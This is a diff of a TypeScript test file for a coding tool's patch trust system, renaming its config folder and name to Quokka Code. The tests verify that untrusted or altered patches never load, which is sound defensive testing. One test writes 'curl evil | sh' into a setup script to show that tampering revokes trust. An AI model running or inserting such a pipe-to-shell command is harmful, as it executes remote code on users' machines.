@@ -26,7 +26,7 @@ import type { AdapterOutput } from '../../src/adapters/types.ts';
 const MARKS = tmpDir();
 
 function writePatch(folder: string, name: string, title: string): { file: string; mark: string } {
-  const dir = path.join(folder, '.threadbear', 'patches');
+  const dir = path.join(folder, '.quokkacode', 'patches');
   fs.mkdirSync(dir, { recursive: true });
   const file = path.join(dir, `${name}.ts`);
   const where = crypto.createHash('sha1').update(folder).digest('hex').slice(0, 8);
@@ -96,9 +96,9 @@ test('an untrusted project patch is listed but never imported; trusting that ver
 
 test('home patches and always-trusted folders load without asking; anything else in a new folder waits', async () => {
   const root = tmpDir();
-  const own = path.join(root, 'threadbear');
+  const own = path.join(root, 'quokkacode');
   writePatch(own, 'checks', 'Check');
-  writePatch(root, 'mine', 'Mine'); // ~/.threadbear/patches, with root as home
+  writePatch(root, 'mine', 'Mine'); // ~/.quokkacode/patches, with root as home
   const other = path.join(root, 'other');
   writePatch(other, 'x', 'X');
   const trust = new PatchTrust({ always: [own] });
@@ -115,9 +115,9 @@ test("a worktree of a trusted repo is trusted as its main checkout; a folder can
   const v = writePatch(main, 'tools', 'Go');
   const wt = path.join(root, 'app-threads', 'abc');
   git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
-  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
+  fs.cpSync(path.join(main, '.quokkacode'), path.join(wt, '.quokkacode'), { recursive: true });
   assert.equal(fs.realpathSync(mainCheckoutOf(wt)!), fs.realpathSync(main));
-  assert.equal(fs.realpathSync(folderKey(path.join(wt, '.threadbear/patches/tools.ts'))), fs.realpathSync(main));
+  assert.equal(fs.realpathSync(folderKey(path.join(wt, '.quokkacode/patches/tools.ts'))), fs.realpathSync(main));
 
   const trust = new PatchTrust();
   trust.trustCurrent([v.file]);
@@ -130,7 +130,7 @@ test("a worktree of a trusted repo is trusted as its main checkout; a folder can
   fs.mkdirSync(fake, { recursive: true });
   const record = git(wt, 'rev-parse', '--git-dir').trim();
   fs.writeFileSync(path.join(fake, '.git'), `gitdir: ${path.resolve(wt, record)}\n`);
-  fs.cpSync(path.join(main, '.threadbear'), path.join(fake, '.threadbear'), { recursive: true });
+  fs.cpSync(path.join(main, '.quokkacode'), path.join(fake, '.quokkacode'), { recursive: true });
   assert.equal(mainCheckoutOf(fake), undefined);
   const inFake = await loadPatchSet(fake, root, new Map(), [], [], undefined, trust);
   assert.equal(inFake.actions.length, 0);
@@ -144,7 +144,7 @@ test("a worktree thread whose project has the main checkout reads the repo's pat
   writePatch(path.join(main, 'web'), 'site', 'Preview');
   const wt = path.join(root, 'app-threads', 'abc');
   git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
-  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
+  fs.cpSync(path.join(main, '.quokkacode'), path.join(wt, '.quokkacode'), { recursive: true });
   fs.cpSync(path.join(main, 'web'), path.join(wt, 'web'), { recursive: true });
   // The checks chips showed twice, the second set under +N (Mike, 30 Oct).
   const set = await loadPatchSet(wt, root, new Map(), [{ folder: main, projectId: 'p_1' }]);
@@ -160,12 +160,12 @@ test("a worktree thread whose project has the main checkout reads the repo's pat
 test('an untrusted worktree patch makes no worktree', async () => {
   const root = tmpDir();
   const project = path.join(root, 'app');
-  fs.mkdirSync(path.join(project, '.threadbear/patches'), { recursive: true });
-  fs.writeFileSync(path.join(project, '.threadbear/patches/wt.ts'), `export default { worktree: { setup: "./setup.sh" } };`);
+  fs.mkdirSync(path.join(project, '.quokkacode/patches'), { recursive: true });
+  fs.writeFileSync(path.join(project, '.quokkacode/patches/wt.ts'), `export default { worktree: { setup: "./setup.sh" } };`);
   fs.writeFileSync(path.join(project, 'setup.sh'), 'echo hi\n');
   assert.equal(await findWorktreePatch(project, root, new Map(), undefined, new PatchTrust()), undefined);
   const trust = new PatchTrust();
-  trust.trustCurrent([path.join(project, '.threadbear/patches/wt.ts')]);
+  trust.trustCurrent([path.join(project, '.quokkacode/patches/wt.ts')]);
   assert.equal((await findWorktreePatch(project, root, new Map(), undefined, trust))?.setup, './setup.sh');
 });
 
@@ -185,7 +185,7 @@ test('runner: a thread in an untrusted folder gets no actions until patches.trus
   assert.equal(fs.existsSync(v.mark), false);
 
   // Only a file the thread lists, and only the version it showed.
-  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: '/etc/x/.threadbear/patches/a.ts', hash: t.patches![0].hash! }]), (e: RpcError) => e.code === -32602);
+  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: '/etc/x/.quokkacode/patches/a.ts', hash: t.patches![0].hash! }]), (e: RpcError) => e.code === -32602);
   await assert.rejects(h.runner.trustPatches(thread.id, [{ file: v.file, hash: 'a'.repeat(64) }]), (e: RpcError) => e.code === -32602);
   await h.runner.trustPatches(thread.id, [{ file: v.file, hash: t.patches![0].hash! }]);
   t = h.runner.get(thread.id);
@@ -411,12 +411,12 @@ test('runner: the first start with patch trust trusts what its threads were alre
 // A patch that imports a helper two levels deep, as a repo would share
 // code between its patches.
 function writeHelperPatch(folder: string): { file: string; helper: string; deep: string } {
-  const dir = path.join(folder, '.threadbear', 'patches');
-  fs.mkdirSync(path.join(folder, '.threadbear', 'lib'), { recursive: true });
+  const dir = path.join(folder, '.quokkacode', 'patches');
+  fs.mkdirSync(path.join(folder, '.quokkacode', 'lib'), { recursive: true });
   fs.mkdirSync(dir, { recursive: true });
-  const deep = path.join(folder, '.threadbear', 'lib', 'deep.ts');
+  const deep = path.join(folder, '.quokkacode', 'lib', 'deep.ts');
   fs.writeFileSync(deep, `export const cmd = "true";\n`);
-  const helper = path.join(folder, '.threadbear', 'lib', 'actions.ts');
+  const helper = path.join(folder, '.quokkacode', 'lib', 'actions.ts');
   fs.writeFileSync(helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go', run: cmd }];\n`);
   const file = path.join(dir, 'tools.ts');
   fs.writeFileSync(file, `import fs from 'node:fs';\nimport { actions } from '../lib/actions.ts';\nvoid fs;\nexport default { actions };\n`);
@@ -452,7 +452,7 @@ test('a patch with no local imports is hashed under the version tag too, not as 
   const set = await loadPatchSet(path.join(root, 'p'), root, new Map(), [], [], undefined, trust);
   const own = crypto.createHash('sha256').update(fs.readFileSync(v.file)).digest('hex');
   assert.notEqual(set.patches[0].hash, own);
-  assert.equal(set.patches[0].hash, crypto.createHash('sha256').update(JSON.stringify(['threadbear-patch-3', own, []])).digest('hex'));
+  assert.equal(set.patches[0].hash, crypto.createHash('sha256').update(JSON.stringify(['quokkacode-patch-3', own, []])).digest('hex'));
   assert.equal(set.patches[0].helpers, undefined);
 });
 
@@ -515,8 +515,8 @@ test("a version 1 trust file (hashes of patch files alone) still loads, but ever
 
 // A patch file with the given text, and anything else it needs beside it.
 function writeRaw(folder: string, text: string, files: Record<string, string> = {}): string {
-  const file = path.join(folder, '.threadbear', 'patches', 'tools.ts');
-  for (const [name, body] of Object.entries({ ...files, '.threadbear/patches/tools.ts': text })) {
+  const file = path.join(folder, '.quokkacode', 'patches', 'tools.ts');
+  for (const [name, body] of Object.entries({ ...files, '.quokkacode/patches/tools.ts': text })) {
     fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
     fs.writeFileSync(path.join(folder, name), body);
   }
@@ -525,7 +525,7 @@ function writeRaw(folder: string, text: string, files: Record<string, string> = 
 
 test('a patch that loads code by a computed name, or more files than are followed, never loads, even once trusted', async () => {
   const root = tmpDir();
-  const helper = { '.threadbear/lib/a.ts': 'export const a = 1;\n' };
+  const helper = { '.quokkacode/lib/a.ts': 'export const a = 1;\n' };
   const cases: [string, string][] = [
     ['const name = "../lib/a.ts";\nawait import(name);', 'import(name)'],
     ['await import(`../lib/${"a"}.ts`);', 'import(`../lib/${"a"}.ts`)'],
@@ -562,7 +562,7 @@ test('a patch that loads code by a computed name, or more files than are followe
   // A helper's computed import counts too, and is named by its path.
   const deep = path.join(root, 'deep');
   const file = writeRaw(deep, "import { a } from '../lib/a.ts';\nexport default { actions: [{ title: String(a), run: 'true' }] };\n", {
-    '.threadbear/lib/a.ts': 'export const a = 1;\nexport const load = (n: string) => import(n);\n',
+    '.quokkacode/lib/a.ts': 'export const a = 1;\nexport const load = (n: string) => import(n);\n',
   });
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
@@ -572,7 +572,7 @@ test('a patch that loads code by a computed name, or more files than are followe
   // More helpers than are followed.
   const many = path.join(root, 'many');
   const lib: Record<string, string> = {};
-  for (let n = 0; n <= 100; n++) lib[`.threadbear/lib/h${n}.ts`] = `export const h${n} = ${n};\n`;
+  for (let n = 0; n <= 100; n++) lib[`.quokkacode/lib/h${n}.ts`] = `export const h${n} = ${n};\n`;
   const big = writeRaw(many, Object.keys(lib).map((k, n) => `import { h${n} } from '../lib/${path.basename(k)}';`).join('\n') + '\nexport default {};\n', lib);
   const t2 = new PatchTrust();
   t2.trustCurrent([big]);
@@ -599,7 +599,7 @@ test("literal imports, packages and calls that only look like loading still hash
       "void [fs, z, o.import('y'), note];",
       "export default { actions: [{ title: `Go ${a}${b}${c}`, run: 'true' }] };",
     ].join('\n'),
-    { '.threadbear/lib/a.ts': 'export const a = 1;\n', '.threadbear/lib/b.ts': 'export const b = 2;\n', '.threadbear/lib/c.ts': 'export const c = 3;\n' },
+    { '.quokkacode/lib/a.ts': 'export const a = 1;\n', '.quokkacode/lib/b.ts': 'export const b = 2;\n', '.quokkacode/lib/c.ts': 'export const c = 3;\n' },
   );
   const trust = new PatchTrust();
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
@@ -626,16 +626,16 @@ test('a script the patch names (its setup, an action) is hashed too, so a pull t
     {
       'scripts/setup.sh': 'echo setting up\n',
       'runner/check.sh': 'echo checking\n',
-      '.threadbear/deploy/go.sh': 'echo deploying\n',
+      '.quokkacode/deploy/go.sh': 'echo deploying\n',
       'icon.png': 'not really a png',
     },
   );
   const trust = new PatchTrust();
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
-  // Relative to the folder holding .threadbear/ (where commands run) or to
+  // Relative to the folder holding .quokkacode/ (where commands run) or to
   // the patch file, and what a command reaches after a cd (runner/check.sh).
   // A picture is only shown, never run, so it isn't asked about.
-  assert.deepEqual(set.patches[0].helpers?.map((h) => path.relative(fs.realpathSync(folder), h)).sort(), ['.threadbear/deploy/go.sh', 'runner/check.sh', 'scripts/setup.sh']);
+  assert.deepEqual(set.patches[0].helpers?.map((h) => path.relative(fs.realpathSync(folder), h)).sort(), ['.quokkacode/deploy/go.sh', 'runner/check.sh', 'scripts/setup.sh']);
   trust.trust(file, set.patches[0].hash!);
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.deepEqual(set.actions.map((a) => a.title), ['Deploy']);
@@ -727,7 +727,7 @@ test("a patch or helper that can't be parsed never loads", async () => {
   const root = tmpDir();
   const folder = path.join(root, 'broken');
   const file = writeRaw(folder, "import { a } from '../lib/a.ts';\nexport default { actions: [{ title: a, run: 'true' }] };\n", {
-    '.threadbear/lib/a.ts': 'export const a = ;\n',
+    '.quokkacode/lib/a.ts': 'export const a = ;\n',
   });
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
@@ -849,12 +849,12 @@ test('a script named from both the patch folder and the repo folder hashes both,
   const root = tmpDir();
   const folder = path.join(root, 'repo');
   fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
-  const file = writeRaw(folder, "export default { worktree: { setup: './setup.sh' } };\n", { 'setup.sh': 'echo root\n', '.threadbear/patches/setup.sh': 'echo patches\n' });
+  const file = writeRaw(folder, "export default { worktree: { setup: './setup.sh' } };\n", { 'setup.sh': 'echo root\n', '.quokkacode/patches/setup.sh': 'echo patches\n' });
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].error, undefined);
-  // The one setup runs: from the folder holding .threadbear/.
+  // The one setup runs: from the folder holding .quokkacode/.
   const real = fs.realpathSync(folder);
   assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `cd '${real}' && '${real}/setup.sh'`);
   bump(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
@@ -862,9 +862,9 @@ test('a script named from both the patch folder and the repo folder hashes both,
   assert.equal(set.patches[0].untrusted, 'changed');
 });
 
-test("Threadbear's own checkout and home patches aren't held to it: they're trusted whatever they hold", async () => {
+test("Quokka Code's own checkout and home patches aren't held to it: they're trusted whatever they hold", async () => {
   const root = tmpDir();
-  const own = path.join(root, 'threadbear');
+  const own = path.join(root, 'quokkacode');
   writeRaw(own, "export default { worktree: { setup: './worktree-setup.sh' }, hooks: [{ title: 'Typecheck', on: 'turn.end', run: 'cd runner && npx tsc --noEmit -p .' }] };\n", { 'worktree-setup.sh': 'echo hi\n' });
   const trust = new PatchTrust({ always: [own] });
   const set = await loadPatchSet(own, root, new Map(), [], [], undefined, trust);
@@ -1053,8 +1053,8 @@ test("a trusted patch's bare import of a workspace package (a file of the repo's
   fs.mkdirSync(path.join(other, '.git'), { recursive: true });
   const marks = tmpDir();
   const ran = path.join(marks, 'ran');
-  fs.mkdirSync(path.join(other, '.threadbear', 'lib'), { recursive: true });
-  fs.writeFileSync(path.join(other, '.threadbear', 'lib', 'x.ts'), `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(ran)}, 'x');\nexport const t = 'X';\n`);
+  fs.mkdirSync(path.join(other, '.quokkacode', 'lib'), { recursive: true });
+  fs.writeFileSync(path.join(other, '.quokkacode', 'lib', 'x.ts'), `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(ran)}, 'x');\nexport const t = 'X';\n`);
   const p = writeRaw(other, "export default { actions: [{ title: 'Go', run: 'true' }] };\n");
   const t2 = new PatchTrust();
   t2.trustCurrent([p]);
